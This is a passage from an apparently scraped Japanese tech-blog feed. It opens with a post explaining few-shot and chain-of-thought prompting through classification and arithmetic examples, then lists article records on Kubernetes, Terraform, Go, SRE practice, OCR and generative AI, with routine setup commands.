NHK公開芸能Few-shotプロンプティングFew-Shotプロンプティングは、大規模言語モデル（LLM）に対して、タスクを実行するための具体的な例をいくつか示すことで、モデルの性能を向上させるプロンプトエンジニアリングの手法です。Zero-Shotプロンプティングとの違いZero-Shotプロンプティングが、一切の例を示さずにタスクを実行させるのに対し、Few-Shotプロンプティングでは、少数の例を提示することで、モデルがより効率的にタスクを学習できるようにします。以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================「紅白出場歌手の選考基準 NHK公開」===========================以下は例です「G20 バイデン氏不在で集合写真」：政治「岡田将生&高畑充希結婚 SNS反応」：芸能芸能Zero-shot Chain-of-ThoughtプロンプティングZero-shot Chain-of-Thought（CoT）プロンプティングは、大規模言語モデル（LLM）に対して、具体的な例を示すことなく、段階的な推論プロセスを踏ませるように指示するプロンプトエンジニアリングの手法です。回答だけ一言で出力してください。10 + 2 * 3 - 4 * 28ステップバイステップで考えてください。10 + 2 * 3 - 4 * 2## ステップバイステップで解いてみましょう！**与えられた式:** 10 + 2 * 3 - 4 * 2**解き方:**数学では、**掛け算と割り算**は、**足し算と引き算**よりも先に計算します。これを**優先順位**と言います。1.  **掛け算を計算する:**    * 2 * 3 = 6    * 4 * 2 = 8    式は、10 + 6 - 8 に変わります。2.  **残りの計算を行う:**    * 10 + 6 = 16    * 16 - 8 = 8**答え:** 8**まとめ:**与えられた式をステップバイステップで解くと、答えは**8**になります。**ポイント:*** **優先順位:** 掛け算と割り算は、足し算と引き算よりも先に計算します。* **計算順序:** 左から右へ計算していきます。**補足:**もし、計算の順番を変えたい場合は、**かっこ**を使います。例えば、(10 + 2) * 3 - 4 * 2 のようにかっこでくくると、最初に10と2を足してから3をかけることになります。**この説明で理解できましたか？** もし、まだ疑問な点があれば、遠慮なく質問してくださいね。Few-shot Chain-of-ThoughtプロンプティングFew-shot CoTプロンプティングは、大規模言語モデル（LLM）に、いくつかの例を示しながら、段階的な推論プロセスを踏ませることで、より複雑な問題を解かせる手法です。このグループの奇数を合計すると偶数になります。: 4、8、9、15、12、2、1。A: 奇数を全て加えると(9, 15, 1)25になります。答えはFalseです。このグループの奇数を合計すると偶数になります。: 17、10、19、4、8、12、24。A: 奇数を全て加えると(17, 19)36になります。答えはTrueです。このグループの奇数を合計すると偶数になります。: 16、11、14、4、8、13、24。A: 奇数を全て加えると(11, 13)24になります。答えはTrueです。このグループの奇数を合計すると偶数になります。: 17、9、10、12、13、4、2。A: 奇数を全て加えると(17, 9, 13)39になります。答えはFalseです。このグループの奇数を合計すると偶数になります。: 15、32、5、13、82、7、1。A:参考文献LangChainとLangGraphによるRAG・AIエージェント［実践］入門10倍速で成果が出る！ChatGPTスゴ技大全","isoDate":"2024-11-19T08:24:52.000Z","dateMiliSeconds":1732004692000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"PostgreSQLので全文検索拡張機能、pg_bigmを試す","link":"https://zenn.dev/nnaka2992/articles/use_pgbigm_on_cloudsql","contentSnippet":"アプリケーションを開発しているとアプリケーションログの分析や、JSONデータに対する分析など全文検索機能を求められることがたびたびあります。そういった場合はElasticsearchのように全文検索に特化したデータベースを導入することが多いです。しかし単純な文章の検索[^特にトランザクション用途]や小規模に利用される場合ばわざわざ専用のデータベースを管理作りたくないというケースが多いです。今回はPostgreSQLで利用可能な全文検索インデックスの拡張機能であるpg_bigmを紹介します。 検証環境の作成 CloudSQL 構成Cloud SQL EditionsE...","isoDate":"2024-11-16T11:12:07.000Z","dateMiliSeconds":1731755527000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"スリーシェイク、Think IT連載「Kubernetesスペシャリストが注目する関連ツール探求」が連載開始から1周年","link":"https://sreake.com/blog/kubernetes-2/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、インプレスグループが運営するエンジニア向け技術解説サイト「Think IT」にて連載中の「Kubernetesスペシャリストが注目する関連ツール探求」が、連載開始から1周年を迎えることをお知らせします。The post スリーシェイク、Think IT連載「Kubernetesスペシャリストが注目する関連ツール探求」が連載開始から1周年 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-14T01:00:00.000Z","dateMiliSeconds":1731546000000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、「CloudNative Days Winter 2024」に出展・登壇","link":"https://sreake.com/blog/cloudnative-days-winter-2024/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2024年11⽉28日（木）・29日（金）に開催される「CloudNative Days Winter 2024」に出展および登壇することをお知らせします。The post スリーシェイク、「CloudNative Days Winter 2024」に出展・登壇 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-12T01:19:07.000Z","dateMiliSeconds":1731374347000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kubernetes Sidecar 一問一答","link":"https://sreake.com/blog/kubernetes-native-sidecar/","contentSnippet":"はじめに Kubernetes 1.29からBeta機能となったSidecar Containerという機能を使う機会があったので、これについて一問一答形式で概要を共有してみようと思います。 小粒なTipsになりますがご […]The post Kubernetes Sidecar 一問一答 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-08T04:06:41.000Z","dateMiliSeconds":1731038801000,"authorName":"Sreake","authorId":"Sreake"},{"title":"データベースリライアビリティエンジニアリング輪読会","link":"https://sreake.com/blog/database-reliability-engineering-reading-circle/","contentSnippet":"はじめに こんにちは。株式会社スリーシェイク Sreake 事業部に所属している @Sugo Fumitaka です。Sreake 事業部は技術力が求められる領域で豊富な経験を持つ SRE の専門家が集まったチームです。 […]The post データベースリライアビリティエンジニアリング輪読会 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-08T04:00:52.000Z","dateMiliSeconds":1731038452000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SREの前に","link":"https://speakerdeck.com/nwiizo/srenoqian-ni","contentSnippet":"2024年11月06日(水) 18:00～19:00の予定に遅刻してしまい、大変申し訳ございませんでした。お詫びとして、当初非公開予定であった資料を公開させていただきます。元々、公開する予定ではなかったので補足が足りない部分などあると思いますのでご容赦下さい。\\r\\rブログなどで補足情報出すかもなので気になればフォローしてください\\r- https://syu-m-5151.hatenablog.com/\\r- https://x.com/nwiizo\\r\\r\\rSREの前に - 運用の原理と方法論\\r公式URL: https://talent.supporterz.jp/events/2ed2656a-13ab-409c-a1d9-df8383be25fd/","isoDate":"2024-11-06T05:00:00.000Z","dateMiliSeconds":1730869200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"スリーシェイク、「SRE総合支援コンサルティングサービス」および「Datadog導入支援サービス」を AWS Marketplace で提供開始","link":"https://sreake.com/blog/datadog_aws-marketplace/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）が提供する「SRE総合支援コンサルティングサービス」および「DataDog導入支援サービス」を AWS Marketplace で提供開始したことをお知らせします。The post スリーシェイク、「SRE総合支援コンサルティングサービス」および「Datadog導入支援サービス」を AWS Marketplace で提供開始 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-05T02:34:26.000Z","dateMiliSeconds":1730774066000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Generative AI Summit Tokyo ’24 Fallに参加しました","link":"https://sreake.com/blog/generative-ai-summit-tokyo-24-fall-2/","contentSnippet":"Sreake事業部インターン生の荒木です。先日Generative AI Summit Tokyo ’24 Fallに参加してまいりました！本イベントで得られた知見や、セッションの様子などを紹介します。 内容 […]The post Generative AI Summit Tokyo ’24 Fallに参加しました first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-05T01:02:35.000Z","dateMiliSeconds":1730768555000,"authorName":"Sreake","authorId":"Sreake"},{"title":"FinOpsとは 〜クラウドネイティブ・SRE・CCoEの導入によるFinOpsの実践〜","link":"https://sreake.com/blog/finops%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに 現在、さまざまな業界の多種多様なシステムにおいて、クラウドサービス\xad\xadが広く活用されています。 クラウドネイティブなシステムは、状況に応じて迅速に構築できること、柔軟にスケールできること等の利点がある一方 […]The post FinOpsとは 〜クラウドネイティブ・SRE・CCoEの導入によるFinOpsの実践〜 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-01T04:08:54.000Z","dateMiliSeconds":1730434134000,"authorName":"Sreake","authorId":"Sreake"},{"title":"クラウドネイティブとは 〜新時代を切り拓くためのCCoE・SRE導入と実践〜","link":"https://sreake.com/blog/%e3%82%af%e3%83%a9%e3%82%a6%e3%83%89%e3%83%8d%e3%82%a4%e3%83%86%e3%82%a3%e3%83%96%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに クラウドネイティブとは、クラウドの特性を最適に活用することを目指すアプローチや考え方のことです。 2006年にクラウドコンピューティングという言葉が誕生し、インターネット技術を利用してサービスを提供するコ […]The post クラウドネイティブとは 〜新時代を切り拓くためのCCoE・SRE導入と実践〜 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-01T04:08:34.000Z","dateMiliSeconds":1730434114000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Platform Engineeringとは  〜SRE導入で目指す開発者体験の革新〜","link":"https://sreake.com/blog/platform-engineering/","contentSnippet":"1. はじめに Platform Engineeringとは、開発ポータルなどの共通的なツールやサービスを高度に整備し、開発者体験(DevEx)とソフトウェアデリバリの生産性を向上させるための取り組みです。 これは、企業 […]The post Platform Engineeringとは  〜SRE導入で目指す開発者体験の革新〜 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-01T04:08:14.000Z","dateMiliSeconds":1730434094000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kubernetes Gateway API 入門","link":"https://zenn.dev/tayusa/articles/786e3c11e631fe","contentSnippet":"ちょうど1年前にGAとなったKubernetesのGateway APIを触る機会がなかったので、個人的に理解を深めるようと思います。https://kubernetes.io/blog/2023/10/31/gateway-api-ga/ Gateway API とは？L4とL7ルーティングを担う次世代のKubernetes Ingress、Load Balancing、Service Mesh APIsです。汎用的で表現力があり役割が分離できるように設計されています。役割指向Kubernetesのサービスネットワークの利用と設定を行う組織の役割を表現したAPIリソースに...","isoDate":"2024-10-31T02:57:25.000Z","dateMiliSeconds":1730343445000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"WebサイトやGitHubソースコードを処理 (ハンズオン)","link":"https://shu-kob.hateblo.jp/entry/2024/10/29/190456","contentSnippet":"#7 WebサイトやGitHubソースコードを処理 (ハンズオン)【オンライン】 - connpassgenai-users.connpass.com勉強会の資料です。Google Cloudでクレデンシャルを取得IAMと管理 > サービスアカウント↓こちらの記事を参考shu-kob.hateblo.jp環境変数にセット以下はMacで、.zprofileの場合export GOOGLE_APPLICATION_CREDENTIALS=\\"/path/PROJECT_ID-XXXXXXXXXX.json\\"source ~/.zprofileソースコードを取得github.comgit clone https://github.com/shu-kob/genai-web-github-loadercd genai-web-github-loadernpm iWebページを読んで要約loadWebPages.tsで、プロジェクトIDの書き換えconst project = \'PROJECT_ID\' // 書き換える実行npx tsx loadWebPages.ts https://www.raumen.co.jp/rapedia/study_history/ソースコードの読み込んで仕様書を作成loadGitHubでプロジェクトIDの書き換えconst project = \'PROJECT_ID\' // 書き換える実行npx tsx loadGitHub.ts https://github.com/shu-kob/genai-web-github-loader","isoDate":"2024-10-29T10:04:56.000Z","dateMiliSeconds":1730196296000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cilium Node IPAM LBによるロードバランシング","link":"https://sreake.com/blog/cilium-node-ipam-lb-load-balancing/","contentSnippet":"はじめに Sreake事業部でインターンをしている小林です。 本記事では、Cilium v1.16で追加されたCilium Node IPAM LBを検証しました。 Ciliumのロードバランシング方法 CiliumでL […]The post Cilium Node IPAM LBによるロードバランシング first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-28T05:08:45.000Z","dateMiliSeconds":1730092125000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、 「内製化支援推進 AWS パートナー」認定を取得","link":"https://sreake.com/blog/aws_partner/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 アマゾン ウェブ サービス（以下AWS）の AWS パートナープログラムにおける「内製化支援推進 AWS パートナー」に認定されたことをお知らせします。The post スリーシェイク、 「内製化支援推進 AWS パートナー」認定を取得 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-23T01:00:00.000Z","dateMiliSeconds":1729645200000,"authorName":"Sreake","authorId":"Sreake"},{"title":"TerraformをRenovateで自動バージョンアップし、PR作成とMergeを自動化する","link":"https://zenn.dev/takehiro1111/articles/renovate_description","contentSnippet":"1.Renovateとは？ドキュメントでAutomated dependency updates. Multi-platform and multi-language.と記載されています。簡潔に言うと依存関係を自動で更新してくれるツールです。バージョンアップしてくれ、PR作成~Mergeまで自動で行ってくれます。!reference:https://docs.renovatebot.com/ 2.Dependabotとの比較 Renovateを採用するメリットRenovateだと異なる種類の依存関係でも、プロジェクト単位で1つのPRにまとめてくれてPRの...","isoDate":"2024-10-21T15:37:54.000Z","dateMiliSeconds":1729525074000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"KubernetesセキュリティDeep Dive","link":"https://sreake.com/blog/kubernetes-security-deep-dive/","contentSnippet":"自己紹介 高橋 楓 公立千歳科学技術大学理工学部2年の高橋楓です。普段は趣味や他社の長期インターンにてソフトウェア開発を行っており、インフラ基盤にはDockerを利用しています。しかし、KubernetesやGoogle […]The post KubernetesセキュリティDeep Dive first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-21T11:49:27.000Z","dateMiliSeconds":1729511367000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Goの公開、非公開フィールドについて","link":"https://zenn.dev/kamos/articles/1897b2a80b49c0","contentSnippet":"Goにはjavaでいうreadonlyのような、フィールドの変更を制御するような文法が存在しません。そのためGoではフィールドの公開、非公開が非常に重要な役割を持っています。Goで不変を表現したい場合、非公開なフィールドをつくり、それのゲッターを使って値を参照することが推奨されていますこの記事では興味本位ですが、フィールドの公開、非公開に注目して、どういった挙動をするのかまとめました。 検証 基本形それぞれの公開、非公開のプリミティブ型のフィールドを持っている場合は以下のようになります。pkg/item.gppackage pkgtype Item struct {...","isoDate":"2024-10-19T16:26:12.000Z","dateMiliSeconds":1729355172000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Goのポインタをどう扱うべきか","link":"https://zenn.dev/kamos/articles/d6e79fc82abfaf","contentSnippet":"Goのポインタについて、結局どうやって使い分けたらいいんだっけ?となることがあったので、挙動を整理したうえで使い所をまとめてみました。 ポインタの挙動 基本的な挙動Goのポインタは、変数の値が格納されているメモリアドレスを指します。そのためポインタをPrintすると、その変数のメモリアドレスが表示されます。main.gofunc main() {\\tv := \\"Hello, World!\\" // v is a string\\tp := &v              // p is a pointer to v\\tfmt.Println(v)\\tfmt.Prin...","isoDate":"2024-10-19T07:03:56.000Z","dateMiliSeconds":1729321436000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"生成AI入門","link":"https://speakerdeck.com/shukob/sheng-cheng-airu-men-340f58db-c1be-4877-92b9-7fbf1df3105e","contentSnippet":"https://genai-users.connpass.com/event/333130/\\rOSCオンラインで生成AIの基礎知識から、実際に活用できる技術まで、幅広く解説しました。\\r\\r生成AIとは何か、その仕組みを解説します。\\r生成AIモデルを比較し、具体的なユースケースを紹介します。\\rプロンプトエンジニアリング、RAG (Retrieval Augmented Generation)などの技術を説明します。\\rオープンソースライブラリLangChainについてご紹介します。\\r最後に生成AIが社会に与える影響や、今後の展望について考えます。","isoDate":"2024-10-19T04:00:00.000Z","dateMiliSeconds":1729310400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"スリーシェイク、「Developers X Summit 2024」に出展","link":"https://sreake.com/blog/developers-x-summit-2024/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）が提供するSRE総合支援サービス「Sreake（スリーク）」は、2024年11月14日(木) に開催される「Developers X Summit 2024」にブース出展することをお知らせします。The post スリーシェイク、「Developers X Summit 2024」に出展 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-15T01:36:55.000Z","dateMiliSeconds":1728956215000,"authorName":"Sreake","authorId":"Sreake"},{"title":"[Sidecar Containers] Pod Eviction 時のメッセージの改善","link":"https://zenn.dev/toversus/articles/d78254ad757094","contentSnippet":"はじめに先日 Kubernetes で報告されていたバグを修正する PR を送りました。その時に、今後 Kubernetes へのコントリビュートを考えている方の参考になればと思い、どう取り組んだか (Issue の読み解き方やローカル環境での再現、コードの修正、テストの追加などの一通りの流れ) を脳内ダンプして言語化してみました。それを社内向けに共有していたのですが、PR も無事にマージされたので、一部加筆修正して記事として公開します。Issue: [Sidecar Containers] Eviction message should account for the sid...","isoDate":"2024-10-14T07:39:56.000Z","dateMiliSeconds":1728891596000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Terraformを使ったECS停止時のカスタムSlack通知の実装","link":"https://zenn.dev/takehiro1111/articles/aws_event_ecs","contentSnippet":"1.記事を書いた理由業務でECSの異常停止時にSlackへ通知する仕組みを導入していますが、デフォルトの通知内容だと見辛く、エラーコードや停止理由の確認がAWSコンソールに慣れていない人には難しいという課題がありました 2.構成何らかの理由でECSが停止した際にEventBridgeで設定したルールでキャッチし、SNS,Chatbot経由でSlackへ通知する構成です。Lambdaでも実現出来るかと思いますが、今回は細かい要件を想定しておらず運用工数的にもChatbotで良い感じに通知してくれる構成にしています。クラスメソッドさんの記事を大変参考にさせていただきま...","isoDate":"2024-10-13T03:51:55.000Z","dateMiliSeconds":1728791515000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"スリーシェイク、「Biz/Zine Day 2024 Autumn」に出展","link":"https://sreake.com/blog/biz-zine-day-2024-autumn/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）が提供するSRE総合支援サービス「Sreake（スリーク）」は、2024年10月30日(水) に開催される「Biz/Zine Day 2024 Autumn」にブース出展することをお知らせします。The post スリーシェイク、「Biz/Zine Day 2024 Autumn」に出展 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-10T01:18:48.000Z","dateMiliSeconds":1728523128000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、Generative AI Summit Tokyo ’24 Fall に協賛","link":"https://sreake.com/blog/generative-ai-summit-tokyo-24-fall/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2024年10月8日（火）にGoogle 渋谷オフィスで開催される「Modern Infra & Apps Summit ’24」 (主催：グーグル・クラウド・ジャパン合同会社) にスポンサーとして協賛し、セッション登壇することをお知らせします。The post スリーシェイク、Generative AI Summit Tokyo ’24 Fall に協賛 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-03T01:12:24.000Z","dateMiliSeconds":1727917944000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ポストCloud9？クラウドIDE CoderでPlatform Engineeringを実践する","link":"https://sreake.com/blog/platform-engineering-with-cloud-ide-coder/","contentSnippet":"はじめに こんにちは、Sreake事業部の志羅山です。 早いものでもう10月。私が住む長野県はもう朝晩の気温は10℃台となり、日中もとても過ごしやすい気候です。振り返ると今年の夏は天気も不安定で、とても暑い夏でしたね・・ […]The post ポストCloud9？クラウドIDE CoderでPlatform Engineeringを実践する first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-03T00:44:56.000Z","dateMiliSeconds":1727916296000,"authorName":"Sreake","authorId":"Sreake"},{"title":"BigQuery データキャンバスについて","link":"https://sreake.com/blog/learn-about-bigquery-datacanvas/","contentSnippet":"はじめに こんにちは。Sreake事業部DBREチームのsenoです。10月に入り、暦の上では秋となりました。とはいえ夏の暑さはまだまだ続いておりますね。 最近は、気持ちだけでも秋を感じるために「〇〇の秋」と称して色々や […]The post BigQuery データキャンバスについて first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-02T09:25:24.000Z","dateMiliSeconds":1727861124000,"authorName":"Sreake","authorId":"Sreake"},{"title":"インテックとスリーシェイク、クラウド事業領域で協業し、ユーザー企業のDXを推進 ～両社の得意分野を活かしたクラウドシフトとモダン開発を実現～","link":"https://sreake.com/blog/intec_3shake/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2024年10月8日（火）にGoogle 渋谷オフィスで開催される「Modern Infra & Apps Summit ’24」 (主催：グーグル・クラウド・ジャパン合同会社) にスポンサーとして協賛し、セッション登壇することをお知らせします。The post インテックとスリーシェイク、クラウド事業領域で協業し、ユーザー企業のDXを推進 ～両社の得意分野を活かしたクラウドシフトとモダン開発を実現～ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-30T05:01:51.000Z","dateMiliSeconds":1727672511000,"authorName":"Sreake","authorId":"Sreake"},{"title":"DevEXとは","link":"https://sreake.com/blog/devex%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに Developer Experience（DevEx）は「開発者体験」とも呼ばれ、開発者の生産性と満足度を向上させる考え方や取り組みを指す言葉で、近年非常に注目されている概念です。 開発者にとってストレス […]The post DevEXとは first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-30T01:35:53.000Z","dateMiliSeconds":1727660153000,"authorName":"Sreake","authorId":"Sreake"},{"title":"DevOpsとは","link":"https://sreake.com/blog/devops%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに DevOpsは、ビジネスのスピードを加速させるために開発(Dev)と運用(Ops)の組織が密に連携するための概念とその手法のことです。 この概念は、技術の導入だけでなく開発プロセスや組織文化全体の変革にも […]The post DevOpsとは first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-30T01:35:30.000Z","dateMiliSeconds":1727660130000,"authorName":"Sreake","authorId":"Sreake"},{"title":"オブザーバビリティとは","link":"https://sreake.com/blog/%e3%82%aa%e3%83%96%e3%82%b6%e3%83%bc%e3%83%90%e3%83%93%e3%83%aa%e3%83%86%e3%82%a3%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに 近年、ITシステムの複雑化と大規模化が急速に進み、クラウドネイティブアーキテクチャ、マイクロサービス、コンテナ技術の普及により、システムの構成要素の増加に伴って、その相互依存関係も複雑化しています。 この […]The post オブザーバビリティとは first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-30T01:35:09.000Z","dateMiliSeconds":1727660109000,"authorName":"Sreake","authorId":"Sreake"},{"title":"クラウドセキュリティとは","link":"https://sreake.com/blog/%e3%82%af%e3%83%a9%e3%82%a6%e3%83%89%e3%82%bb%e3%82%ad%e3%83%a5%e3%83%aa%e3%83%86%e3%82%a3%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに 近年、企業のIT環境は急速にクラウド化が進んでいます。 クラウドサービスの利用により、柔軟なリソース管理や迅速なサービス展開が可能になり、ビジネスの迅速な立ち上げや、運用効率化、コスト削減などを実現できる […]The post クラウドセキュリティとは first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-09-30T01:34:40.000Z","dateMiliSeconds":1727660080000,"authorName":"Sreake","authorId":"Sreake"},{"title":"[Terraform/AWS] ステートファイルの切り替えコマンド","link":"https://zenn.dev/takehiro1111/articles/tfstate_switch","contentSnippet":"backend設定の切り替えbackendを別設定へ切り替える際は、コードの記述を変更して以下コマンドを実行します。例えば、Terraformで構築し始めの際にストレージを用意出来ていない場合に一時的にlocalに設定した後にS3に変更するケースで用います。切り替え前のファイルが不要な場合は、コマンド実行後に削除します。 切り替え前のファイルから切り替え後のファイルに既存内容をコピーする必要がある場合terraform init -migrate-state 切り替え前のファイルから切り替え後のファイルに既存内容をコピーしない場合terraform init ...","isoDate":"2024-09-16T13:05:31.000Z","dateMiliSeconds":1726491931000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"[Terraform/AWS] ステートファイルの管理方法(local,s3,terragrunt等)","link":"https://zenn.dev/takehiro1111/articles/terraform_tfstate","contentSnippet":"本記事を読み終わった時のゴールステートファイルの概念、必要性を認識出来る事。状況に応じて適切なbackendの設定が出来る事。\xa0 目次ステートファイルの概要ステートファイルの構文,ロック機能の記述backend設定のパターン別解説backend設定の切り替え(例:local⇔S3)\xa0 本編 1. ステートファイルの説明 ステートファイルとは？Terraform管理下で実際に構築されているリソースのマッピング情報がJSONフォーマットで記述されるファイル。Terraformが内部的に使用するプライベートなAPIとして機能する。このファイ...","isoDate":"2024-09-16T13:05:30.000Z","dateMiliSeconds":1726491930000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"[Terraform/AWS]インストール,初期設定","link":"https://zenn.dev/takehiro1111/articles/terraform_install","contentSnippet":"本記事を読み終わった時のゴールLinux/Macの何れかの環境にTerraformをインストール出来る事。Terraformの主要な管理コマンドをざっくり把握した状態。AWS CLI,HCLでAWS APIを呼び出せるよう適切に認証情報を設定できる事。\xa0 目次Terraformの概念実際にTerraformをインストールする(Mac/Linux)Terraformの主要な管理コマンドCLI,HCLでAWS APIを呼び出せるよう認証情報の設定\xa0 本編 1. Terraformの概念 Terraformとは？米企業の Hashicorp 社...","isoDate":"2024-09-16T13:05:29.000Z","dateMiliSeconds":1726491929000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Google Cloud で生成 AI アプリを評価するアーキテクチャパターン","link":"https://zenn.dev/kimitsu/articles/google-cloud-gen-ai-eval-arch","contentSnippet":"用語について オンライン評価とオフライン評価評価はそのタイミング、やり方によってオンライン評価とオフライン評価に分けられます。オンライン評価とは、システムやモデルが実際の運用中にリアルタイムで評価される手法です。オフライン評価は、事前に用意されたデータセットを使用し、システムやモデルの性能をテスト環境で評価する方法です。生成 AI アプリケーションの場合には、オンライン評価は実際のユーザが生成 AI を利用した際の入出力に対して評価を行います。特徴としては、模範解答を用意することができないため生成 AI による評価（LLM as a Judge）をします。オフライン評...","isoDate":"2024-09-15T13:36:11.000Z","dateMiliSeconds":1726407371000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Google Cloud でのプロンプト管理は Vertex AI Studio を使おう","link":"https://zenn.dev/kimitsu/articles/google-cloud-temporary-prompt-version-management","contentSnippet":"背景Google Cloud では Google Cloud Next \'24 にて Vertex AI Studio の Prompt Version Management とその SDK Support が発表されました。[1]将来的には Google Cloud におけるプロンプト管理はこの機能を使うことになると思われますが、本記事執筆時点では SDK Support は公開されていません。そのため現時点で Google Cloud でプロンプトを管理するのにどのサービスを使うべきか検討した結果を共有します。検討にあたっては以下の観点を考慮しました。バージョン管理機...","isoDate":"2024-09-14T15:52:30.000Z","dateMiliSeconds":1726329150000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"AIを用いたOCR","link":"https://shu-kob.hateblo.jp/entry/2024/09/11/223456","contentSnippet":"OCRとは、Optical Character Recognitionの略で、日本語では光学文字認識といいます。OCRとは何か？OCRは、スキャンした書類や画像に含まれる文字を、コンピュータが読み取り、テキストデータに変換する技術です。つまり、紙に書かれた文字をデジタルの文字に変えて、パソコンで編集したり、検索したりできるようにするものです。OCRの仕組み画像の取り込み: スキャナーやデジタルカメラで、文字が書かれた紙の画像を撮影します。画像の前処理: 画像のノイズ除去や歪みの修正など、文字認識を円滑に行うための処理を行います。文字の切り出し: 画像から文字を一つずつ切り出します。文字の認識: 切り出した文字を、事前に登録された文字のパターンと照合し、どの文字か判定します。テキストデータへの変換: 認識された文字を、テキストデータに変換します。OCRの活用例書類のデジタル化: 紙の書類をスキャンしてテキストデータに変換することで、電子化し、保管や検索を効率化できます。データ入力の自動化: 請求書や領収書などの文字情報を自動的に読み込むことで、データ入力の手間を大幅に削減できます。検索の効率化: テキストデータに変換された文書は、キーワード検索が可能になり、必要な情報に素早くアクセスできます。翻訳: OCRでテキストデータに変換した後に、翻訳ソフトウェアを使って他の言語に翻訳することができます。OCRのメリット作業の効率化: 手作業でのデータ入力に比べて、大幅に作業時間を短縮できます。正確性の向上: 人による入力ミスを減らすことができ、データの正確性を高めます。コスト削減: 人件費の削減につながります。ペーパーレス化: 紙の書類を電子化することで、保管スペースを削減し、環境にも優しいです。OCRの種類OCRには、大きく分けて以下の2種類があります。OCRエンジン: ソフトウェア開発者が、OCR機能を自社のアプリケーションに組み込むために利用するソフトウェアです。OCRサービス: クラウド上で提供されるOCR機能で、APIなどを利用して簡単にOCR機能を導入できます。OCRの選び方OCRを選ぶ際には、以下の点に注意しましょう。認識精度: どの程度の精度で文字を認識できるか。対応言語: どの言語に対応しているか。対応フォント: どのフォントに対応しているか。対応ファイル形式: どのファイル形式に対応しているか。価格: 有料か無料か、料金体系はどうか。AIを用いたOCRcloud.google.comGoogle CloudなどパブリッククラウドでOCR機能が提供されています。Geminiで使用することもできます。OCRの活用の幅が広がり、工数削減に役立ちそうですね。まとめOCRは、紙の文書をデジタル化し、業務効率化に貢献する便利な技術です。様々な分野で活用されており、今後もその重要性はますます高まっていくでしょう。","isoDate":"2024-09-11T13:34:56.000Z","dateMiliSeconds":1726061696000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Apple Intelligence触ってみたい","link":"https://shu-kob.hateblo.jp/entry/2024/09/10/235654","contentSnippet":"k-tai.watch.impress.co.jpiPhone16で、Apple 